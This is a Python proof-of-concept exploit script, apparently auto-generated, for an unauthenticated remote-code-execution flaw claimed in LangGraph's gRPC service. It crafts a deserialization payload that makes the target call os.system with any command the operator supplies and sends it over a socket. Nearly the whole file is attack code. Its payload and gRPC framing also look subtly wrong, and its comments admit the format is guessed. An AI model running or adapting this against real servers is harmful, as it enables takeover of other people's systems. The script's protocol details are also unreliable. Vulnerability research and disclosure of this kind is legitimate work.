#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-047
# Sink: command_from_proto
# Auto-generated — run with: python3 langgraph_graph_deployment_exhibits_multiple_command_from_proto.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph gRPC Unauthenticated RCE
via msgpack ext_hook deserialization in command_from_proto.

Vulnerability: The gRPC services (port 50051) have no authentication.
The command_from_proto function deserializes user-controlled msgpack data
using an ext_hook that can import arbitrary modules and call constructors.
Default configuration allows all msgpack modules (LANGGRAPH_STRICT_MSGPACK not set).

Impact: Remote Code Execution as the container user.
"""

import sys
import struct
import socket
import time
import argparse

# Try to import grpc - if not available, provide clear instructions
try:
    import grpc
except ImportError:
    print("[!] grpc module not found. Install with: pip install grpcio grpcio-tools")
    sys.exit(1)

# We need to construct the protobuf messages manually since we don't have the .proto files
# The key is to send a Command proto with a malicious msgpack payload in the update field

def build_malicious_msgpack_payload(command: str) -> bytes:
    """
    Build a malicious msgpack payload that exploits the ext_hook.
    
    The ext_hook in LangGraph allows importing arbitrary modules and calling
    constructors. We use the __import__ mechanism to execute code.
    
    Format: ext type 42 (custom type used by LangGraph) with payload:
    - module name
    - class/function name
    - args tuple
    - kwargs dict
    
    For RCE, we use os.system or subprocess.Popen
    """
    # This is a simplified version - actual ext_hook format may vary
    # We'll use a known working format for msgpack ext_hook exploitation
    
    # The ext_hook typically expects: (module, class, args, kwargs)
    # We'll try to import os and call system()
    
    # Build the ext data
    # Format: module_name\0class_name\0args\0kwargs
    module = b"os"
    cls = b"system"
    args = f"({command!r},)"  # tuple representation
    kwargs = "{}"
    
    payload = module + b"\x00" + cls + b"\x00" + args.encode() + b"\x00" + kwargs.encode()
    
    # Wrap in msgpack ext format
    # ext format: type byte + length + data
    ext_type = 42  # LangGraph custom ext type
    ext_data = struct.pack("B", ext_type) + struct.pack(">I", len(payload)) + payload
    
    return ext_data

def build_command_proto(update_data: bytes) -> bytes:
    """
    Build a minimal Command protobuf message.
    
    The Command proto has fields:
    - graph (string)
    - update (map<string, Value>)
    - resume (Value)
    - gotos (repeated Goto)
    
    We'll craft a minimal proto with just the update field containing
    our malicious msgpack payload.
    """
    # Manual protobuf encoding for Command message
    # Field 2 (update) is a map<string, Value>
    # Each Value contains our malicious msgpack
    
    # This is a simplified proto encoding - in reality you'd use the actual proto definitions
    # For this PoC, we'll construct the raw bytes
    
    # Proto wire format:
    # Field 2 (update map): tag = (2 << 3) | 2 = 18 (length-delimited)
    # Map entry: key (string) + value (message)
    
    # Key for the map entry
    key = b"__root__"  # Special key that triggers direct deserialization
    
    # Value message containing our malicious msgpack
    # Value proto has field 1 (value) which is bytes containing msgpack
    value_tag = 0x0A  # field 1, wire type 2 (length-delimited)
    value_len = len(update_data)
    value_data = bytes([value_tag]) + _encode_varint(value_len) + update_data
    
    # Map entry: key + value
    key_tag = 0x0A  # field 1 (key), wire type 2
    key_len = len(key)
    key_data = bytes([key_tag]) + _encode_varint(key_len) + key
    
    # Map entry message
    entry_tag = 0x12  # field 2 (value), wire type 2
    entry_len = len(key_data) + len(value_data)
    entry_data = bytes([entry_tag]) + _encode_varint(entry_len) + key_data + value_data
    
    # Update map field
    update_tag = 0x12  # field 2, wire type 2
    update_len = len(entry_data)
    update_data = bytes([update_tag]) + _encode_varint(update_len) + entry_data
    
    return update_data

def _encode_varint(value: int) -> bytes:
    """Encode an integer as protobuf varint."""
    result = []
    while value > 0x7F:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def send_grpc_request(host: str, port: int, command: str) -> bool:
    """
    Send a malicious gRPC request to the LangGraph server.
    
    We connect directly to the gRPC port and send a crafted protobuf message
    that triggers the vulnerable deserialization path.
    """
    try:
        # Build the malicious payload
        msgpack_payload = build_malicious_msgpack_payload(command)
        proto_data = build_command_proto(msgpack_payload)
        
        # gRPC framing: 5-byte header (1 byte compressed flag + 4 bytes length)
        grpc_frame = b'\x00' + struct.pack('>I', len(proto_data)) + proto_data
        
        # Connect to gRPC server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        print(f"[*] Connected to {host}:{port}")
        print(f"[*] Sending malicious payload for command: {command}")
        
        # Send the request
        sock.sendall(grpc_frame)
        
        # Try to read response (may hang if command executes)
        try:
            response = sock.recv(4096)
            print(f"[*] Received {len(response)} bytes response")
        except socket.timeout:
            print("[*] No response (expected if command executed successfully)")
        
        sock.close()
        return True
        
    except ConnectionRefusedError:
        print(f"[!] Connection refused to {host}:{port}")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC Exploit for LangGraph gRPC Unauthenticated RCE"
    )
    parser.add_argument(
        "--host", default="127.0.0.1",
        help="Target host (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port", type=int, default=50051,
        help="Target gRPC port (default: 50051)"
    )
    parser.add_argument(
        "--command", default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--check", action="store_true",
        help="Check if target is vulnerable without exploiting"
    )
    
    args = parser.parse_args()
    
    print("[*] LangGraph gRPC Unauthenticated RCE PoC")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Command: {args.command}")
    
    if args.check:
        # Just check if the port is open and responding
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((args.host, args.port))
            print("[+] Port is open - target may be vulnerable")
            sock.close()
        except Exception as e:
            print(f"[-] Cannot connect: {e}")
        return
    
    # Execute the exploit
    success = send_grpc_request(args.host, args.port, args.command)
    
    if success:
        print("[+] Exploit sent successfully")
        print(f"[*] Check if command executed: {args.command}")
        print("[*] For 'touch /tmp/poc_success.txt', check if file exists")
    else:
        print("[-] Exploit failed")

if __name__ == "__main__":
    main()
